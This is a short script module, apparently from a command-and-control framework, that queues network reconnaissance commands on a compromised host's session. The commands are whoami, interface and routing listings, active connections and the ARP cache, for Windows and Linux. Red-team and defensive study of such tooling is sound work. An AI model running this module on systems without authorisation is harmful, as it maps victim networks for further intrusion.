// modules/recon4.rhai
// Network-focused recon: interfaces, routes, connections, ARP.
fn run(session_id) {
    print("Module 'Recon4' started for Session: " + session_id);

    send_c2_command(session_id, "shell whoami");

    // Network interfaces
    send_c2_command(session_id, "shell ipconfig /all");                 // Windows
    send_c2_command(session_id, "shell ip a");                          // Linux

    // Routing table
    send_c2_command(session_id, "shell route print");                   // Windows
    send_c2_command(session_id, "shell ip route");                      // Linux

    // Active connections
    send_c2_command(session_id, "shell netstat -ano");                  // Windows
    send_c2_command(session_id, "shell ss -tulpn");                     // Linux

    // ARP cache
    send_c2_command(session_id, "shell arp -a");                        // both

    return "Recon4 commands queued for Session " + session_id;
}
